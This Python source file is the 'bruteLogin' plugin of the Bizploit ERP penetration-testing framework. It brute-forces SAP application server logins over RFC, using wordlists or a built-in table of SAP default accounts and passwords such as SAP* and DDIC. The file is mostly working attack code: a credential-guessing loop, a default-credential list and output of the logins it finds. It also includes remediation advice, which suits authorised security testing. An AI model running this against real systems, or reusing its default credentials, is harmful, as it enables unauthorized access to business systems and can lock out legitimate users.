# -*- coding: latin-1 -*-
'''
---------------------------------------------------------------------------
Bizploit - The Opensource ERP Penetration Testing Framework. 
Download at http://www.onapsis.com/bizploit 
--------------------------------------------------------------------------- 

@author:  Mariano Nu�ez Di Croce <mnunez@onapsis.com>    
    
Portions Copyright 2012 ONAPSIS S.R.L.
Base Copyright Mariano Nu�ez Di Croce @ CYBSEC

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
---------------------------------------------------------------------------
'''
from core.basePlugins.baseVulnAssessPlugin import baseVulnAssessPlugin
from core.exceptions.bizploitException import bizploitException
import core.baseResult.pluginResult as pluginResult
from core.baseResult.tableResult import tableResult
import core.lib.misc as misc
import copy
import re

class bruteLogin(baseVulnAssessPlugin):
	'''
	Bruteforces SAP Application Server users/passwords (USE WITH CARE).
	
	@author: Mariano Nu�ez Di Croce 
	'''
	def __init__(self):
		baseVulnAssessPlugin.__init__( self )
		self._runOncePerTarget = True
		
		self._type = 'disabled_for_your_own_good'
		self._userWordlist = ''
		self._pwdWordlist = ''
		self._tryHardcodedSAPStar = False
		self._tryUserAsPwd = False
		self._defaultClients = [000, 001, 066]
		self._tmpConn = None
		self._desc = 'Bruteforces SAP Application Server users/passwords (USE WITH CARE).'
		
		
	def _run_SAPRFC(self):
		userFound = False
		toCheck = {}
		
		try:
			clients = self.getPluginResultFromKB('getClients', 'availableClients','clientList')
		except bizploitException:			
			clients = range(0, 999)
		
		# Check connection first
		self._connector.checkConnection()
		
		# First we copy the connector, so as not to touch the original one.
		self._tmpConn = copy.copy(self._connector)
		
		self.outInformation('Starting bruteforce...')
		if self._type == 'defaultUsers':
			data = self._getDefaultUsers()
			for client in clients:
				toCheck[client] = []
				if client in data.keys():
					toCheck[client].extend(data[client])
				if self._tryHardcodedSAPStar:
					toCheck[client].append('SAP*:PASS')
					
		elif self._type == 'wordlist':
			# Get the users and passwords from wordlist files
			userList = []
			pwdList = []
			try:
				if self._userWordlist:
					userList = misc.readFile(self._userWordlist)
				if self._pwdWordlist:
					pwdList = misc.readFile(self._pwdWordlist)
			except bizploitException,  e:
				self.outInformation("Error -  " +  str(e))
				return True
				
			# Start the loop
			if userList:
				for userIt in userList:
					resPwdList = []
					try:
						client, user, pwd = userIt.split(':')
						client = int(client)
						toCheck[client] = []
					except:
						# Malformed entry.
						self.outDebug('Malformed bruteLogin entry: ' +userIt)
						pass				
					
					if self._tryUserAsPwd:
						resPwdList.append(user)
					# If a password file was specified, we only use that passwords for each user
					if pwdList:
						resPwdList.extend(pwdList)
					else:
						if pwd:
							resPwdList = pwd.split(',')			
					
					for passwd in resPwdList:
						toCheck[client].append(user.strip() + ':' + passwd.strip())
						
		else:
			self.outInformation('BruteLogin type \'' + self._type + '\' not valid.')	
		
		# Start the bruteforcing
		found = {}
		for client in toCheck.keys():
			found[client] = []
			for cred in toCheck[client]:
				user, passwd = cred.split(':')
				try:
					self.outLog('Trying ' + '[%03d' % client + '] ' + user + ':' + passwd + ' ', newLine=False)
					self._tryLogin(client, user, passwd)
					found[client].append(user+':'+passwd)
					self.outVulnerability('Found credentials for user \'' + user + '\' in client '+ '%03d' % client +'.' )
					self.outLog('[SUCCESS]')
					userFound = True
				except bizploitException, e:
					# Check if client was available
					if re.search('Client \d{3} is not available', str(e)):
						self.outLog('[CLIENT_UNAVAILABLE]')
					# For some weird situations regarding S_RFC authorizations
					elif str(e).lower().find('no rfc authorization for function group') != -1:
						found[client].append(user+':'+passwd)
						self.outLog('[SUCCESS]')
						self.outVulnerability('Found credentials for user \'' + user + '\' in client '+ '%03d' % client +'.' )
						userFound = True
					# Check if Locked...
					elif str(e).lower().find('password logon no longer possible') != -1:
						self.outLog('[LOCKED?]')
						self.outWarning('User \'' + user + '\' in client '+ '%03d' % client +' seems to be locked!' )
					elif str(e).lower().find('you cannot log on (cua system') != -1:
						self.outLog('[CUA?]')
					else:
						self.outLog('')
						
			
		
		if userFound:			
			# Create the result object
			resPlugin = pluginResult.pluginResult(self)
			resPlugin.setVulnID(1)
			resPlugin.setName('Access credentials discovered')
			resPlugin.setDesc('It was possible to detect valid credentials to access the target SAP system. This situation would allow a remote attacker to perform unauthorized activities over the system, using the privileges of the discovered user accounts. ')
			resPlugin.setRisk(pluginResult.RISK_HIGH)
			resPlugin.setConnectionInfo(self._target,  self._connector)
			resPlugin.setData('discoveredCredentials',  found)			
			resPlugin.setSolution('If the detected users are not being used, they should be deleted. Otherwise, \n \
											  Configure a strong password to every user and analyze his authorizations.\n \
											  Configure strong password policies through login/* parameters and trivial passwords in table USR40.\n \
											  Use report RSUSR003 in order to check the status of standard users.')
			
			tab = tableResult('users')			
			tab.setTitle('Discovered Credentials')
			tab.setHeader(('Client',  'User',  'Password'))
			resPlugin.addResult(tab)
		
			self.outInformation('\nDiscovered Logons:')
			for c in found.keys():
				for data in found[c]:
					user, passwd = data.split(':')
					self.outInformation('' + '[%03d' % c + '] ' + user + ':' + passwd)
					tab.addRow(('%03d' % c ,  user,  passwd))
			
			self.saveToKB('discoveredCredentials',  resPlugin)
		
		return True

	def _tryLogin(self, client, user, pwd):
		self._tmpConn.setClient(client)
		self._tmpConn.setUser(user)
		self._tmpConn.setPasswd(pwd)
		# We force the language to english, so that we can parse the errors
		self._tmpConn.setLang('EN')
		
		try:
			self._tmpConn.connect(lcheck=1)
			self._tmpConn.disconnect()
		except bizploitException,  e:
			self._tmpConn.disconnect()
			raise e
		
	def _getDefaultUsers(self):
		'''
		Return default user id/passwords
		'''
		cred = {}
		cred[0] = ['SAP*:06071992', 'DDIC:19920706',  'SAPCPIC:ADMIN']
		cred[1] = ['SAP*:06071992', 'DDIC:19920706',  'SAPCPIC:ADMIN']
		cred[66] = ['SAP*:06071992', 'EARLYWATCH:SUPPORT', 'SAPCPIC:ADMIN']
		
		return cred
	
	
	def getOptionsXML(self):
		'''
		This method returns a XML containing the Options that the plugin has.
		Using this XML the framework will build a window, a menu, or some other input method to retrieve
		the info from the user. The XML has to validate against the xml schema file located at :
		bizploit/core/ui/userInterface.dtd
		
		@return: XML with the plugin options.
		'''	
		return	'<?xml version="1.0" encoding="ISO-8859-1"?>\
		<OptionList>\
			<Option name="type">\
				<default>' + self._type +'</default>\
				<desc>Bruteforce type [defaultUsers|wordlist]</desc>\
				<type>String</type>\
				<required>True</required>\
				<visible>True</visible>\
			</Option>\
			<Option name="userWordlist">\
				<default>' + self._userWordlist +'</default>\
				<desc>User ID wordlist file (client:userid:[passwd1,passwd2] entries)</desc>\
				<type>String</type>\
				<required>False</required>\
				<visible>True</visible>\
			</Option>\
			<Option name="pwdWordlist">\
				<default>' + self._pwdWordlist +'</default>\
				<desc>Password wordlist file.</desc>\
				<type>String</type>\
				<required>False</required>\
				<visible>True</visible>\
			</Option>\
			<Option name="tryHardcodedSAPStar">\
				<default>' + str(self._tryHardcodedSAPStar) +'</default>\
				<desc>Try the hardcoded SAP* user.</desc>\
				<type>Boolean</type>\
				<required>False</required>\
				<visible>True</visible>\
			</Option>\
			<Option name="tryUserAsPwd">\
				<default>' + str(self._tryUserAsPwd) +'</default>\
				<desc>Try the username as the password.</desc>\
				<type>Boolean</type>\
				<required>False</required>\
				<visible>True</visible>\
			</Option>\
		</OptionList>\
		'

	def setOptions( self, OptionList ):
		'''
		This method sets all the options that are configured using the user interface 
		generated by the framework using the result of getOptionsXML().
		
		@parameter OptionList: A dictionary with the options for the plugin.
		@return: No value is returned.
		'''	
		if 'type' in OptionList.keys(): 
			self._type = OptionList['type']
		if 'userWordlist' in OptionList.keys(): 
			self._userWordlist = OptionList['userWordlist']
		if 'pwdWordlist' in OptionList.keys(): 
			self._pwdWordlist = OptionList['pwdWordlist']
		if 'tryUserAsPwd' in OptionList.keys(): 
			self._tryUserAsPwd = OptionList['tryUserAsPwd']
		if 'tryHardcodedSAPStar' in OptionList.keys(): 
			self._tryHardcodedSAPStar = OptionList['tryHardcodedSAPStar']
